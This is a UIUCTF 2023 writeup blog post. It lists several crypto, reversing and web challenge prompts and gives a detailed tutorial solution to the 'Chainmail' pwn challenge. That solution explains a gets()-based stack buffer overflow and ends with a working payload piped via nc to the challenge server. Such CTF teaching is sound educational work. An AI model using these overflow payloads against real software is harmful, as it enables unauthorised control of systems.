---
title: UIUCTF 2023 Writeups
---

# UIUCTF 2023 Writeups
## Overview
Last weekend, our *rival* Sigpwny hosted their UIUCTF. We ranked 24th in the end. I solved 6 crypto, 4 reverse, and 1 pwn. This post will go through some of my solves in details. Hopefully this can serve as a tutorial for simular challenges in the future.

Challenge solved after the competition are marked as \[\*\] 

<!--more-->

There will also be brief note on other challenge solved, though not as in depth.
## Crypto
### Three-Time Pad
```text
We've been monitoring our adversaries' communication channels, but they encrypt their data with XOR one-time pads! However, we hear rumors that they're reusing the pads...

closed are three encrypted messages. Our mole overheard the plaintext of message 2. Given this information, can you break the enemy's encryption and get the plaintext of the other messages?

Author: Pomona
Solves: 390
```

### At Home
```text
Mom said we had food at home

Author: Anakin
Solves: 316
```

### Group Project(ion)
```text
Group Project
In any good project, you split the work into smaller tasks...

nc group.chal.uiuc.tf 1337
---
Group Projection
I gave you an easier project last time. This one is sure to break your grade!

nc group-projection.chal.uiuc.tf 1337

Author: Anakin
Solves: 232 (ver1)/ 127 (ver2)
```

### Morphing Time
```text
The all revealing Oracle may be revealing a little too much...

nc morphing.chal.uiuc.tf 1337

Author: Anakin
Solves: 140
```

### Crack The Safe
```text
I found this safe, but something about it seems a bit off - can you crack it?

Author: Anakin
Solves: 62
```

## Reversing
### vmwhere
```text
Usage: ./chal program

Author: richard
Solves: 124 (ver1)/ 66 (ver2)
```
### geoguesser
```text
I thought geoguesser was too easy, so I made it harder.

Usage: janet -i program.jimage

nc geoguesser.chal.uiuc.tf 1337

Author: richard
Solves: 38
```

### Fast Calculator
```text
Check out our new super fast calculator!

This challenge is sponsored by Battelle.

Author: Minh
Solves: 36
```
## Pwn
### Chainmail
```text
I've come up with a winning idea to make it big in the Prodigy and Hotmail scenes (or at least make your email widespread)!

nc chainmail.chal.uiuc.tf 1337

Author: Emma
Solves: 256
```
{% capture chainmail_c %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void give_flag() {
    FILE *f = fopen("/flag.txt", "r");
    if (f != NULL) {
        char c;
        while ((c = fgetc(f)) != EOF) {
            putchar(c);
        }
    }
    else {
        printf("Flag not found!\n");
    }
    fclose(f);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char name[64];
    printf("Hello, welcome to the chain email generator! Please give the name of a recipient: ");
    gets(name);
    printf("Okay, here's your newly generated chainmail message!\n\nHello %s,\nHave you heard the news??? Send this email to 10 friends or else you'll have bad luck!\n\nYour friend,\nJim\n", name);
    return 0;
}
```
{% endcapture %}
{% include widgets/toggle-field.html toggle-name="chainmail_c" button-text="Show chal.c" toggle-text=chainmail_c %}

In this challenge, we are given the source code. The challenge ask for a user input using gets, then print out the string after some formating. Notice that the input is taken using `gets`, this is a particularly dangerous function to use. Even the compiler warns you when using this function. But why is `gets` dangerous?

```
chainmail$ gcc chal.c -o chal
chal.c: In function main:
chal.c:27:5: warning: implicit declaration of function gets; did you mean fgets? [-Wimplicit-function-declaration]
   27 |     gets(name);
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/ccOKvDUG.o: in function `main':
chal.c:(.text+0x103): warning: the `gets' function is dangerous and should not be used.
```

Well according to the functional specification, `gets` will keep reading input until a newline. This means that you can enter hundrads of characters and the function will not stop you. This combined with a finite buffer size means like you can control data on the stack.

There are a lot of useful thing stored on the stack, like the saved rbp to restore stack frame, and various local variable. But the most interesting one for exploitation purposes is the saved rip, which tells the program where to return back when this function ends. If we overwrite this value, the program will thing that this function is called by some weird location that we tell it, and resume execute from that location. 

Now we know the vulnerability, let's see how we can exploit this. We first check what protections are enabled on the compiled binary.

```bash
chainmail$ checksec ./chal
[*] '/mnt/c/Users/brons/ctf/uiucctf2023/chainmail/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Seems like only NX is enabled, which stands for Not-eXecutable stack. Since there is a function that print out the flag for us, this doesn't matter for us. All we need to do is to redirect the control flow to the start of this function and it will give us the flag. If you want to learn more detail stack buffer overflow and how the function redirection works, [this video by LiveOverflow](https://youtu.be/8QzOC8HfOqU) is a great learning resource. Personally I learn a lot of the fundamentals from [his playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) as well. 

There are a lot of methods to find the location of give_flag, like opening in ghidra or use cli tools like readelf
```bash
chainmail$ readelf -s ./chal|grep give_flag
    27: 0000000000401216   114 FUNC    GLOBAL DEFAULT   15 give_flag
```

From this we can craft a payload: 64 `a`s to fill the buffer, another 8  `a` as padding for saved rbp, and the print flag location in bytes ("\x16\x12\x40\x00\x00\x00\x00\x00") for the save rip. This will overflow the stack, and after the main function ends, it will call the print flag function for us and this should print the flag, right?

If we send this payload, you'll notice that it didn't work, if we check with gdb you'll notice that it segfault at some location. This is caused by stack alignment, where some libc function that used assembly instructions that require a 0x10 byte alignment. One way to solve this is to omit the first `push rbp` instruction in give_flag. So instead of jumping to 0x401216, we'll jump to 0x40121b. This aligns the stack and the program will no longer segfault.

With that, all we need is to send the payload to remote and profile =D

flag:  `uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}`

```
chainmail$ echo -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x12\x40\x00\x00\x00\x00\x00' | nc chainmail.chal.uiuc.tf 1337
== proof-of-work: disabled ==
Hello, welcome to the chain email generator! Please give the name of a recipient: Okay, here's your newly generated chainmail message!

Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,
Have you heard the news??? Send this email to 10 friends or else you'll have bad luck!

Your friend,
Jim
uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}
```

## Web
### Future Disk [*]
```text
I'm from the year 2123. Here's what I did:

-    Mounted my 10 exabyte flash drive
-    fallocate -l 8E haystack.bin
-    dd if=flag.txt bs=1 seek=[REDACTED] conv=notrunc of=haystack.bin
-    gzip haystack.bin
-    Put haystack.bin.gz on my web server for you to download

HTTP over Time Travel is a bit slow, so I hope gzipping it made it a little faster to download :)
https://futuredisk-web.chal.uiuc.tf/haystack.bin.gz

Author: kuilin
Solves: 22
```
